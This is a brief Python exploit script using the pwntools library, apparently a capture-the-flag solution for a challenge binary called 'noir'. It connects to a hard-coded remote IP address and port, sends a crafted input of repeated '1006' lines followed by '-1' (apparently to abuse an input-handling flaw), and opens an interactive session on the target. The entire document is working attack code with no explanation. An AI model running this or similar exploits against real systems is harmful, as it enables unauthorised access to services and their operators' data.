

from pwn import *

p = remote('203.34.119.237', 11338)
# p = process('./noir')

payload = "1006\n"*4 + "-1"

p.sendline(payload)

p.interactive()
p.close()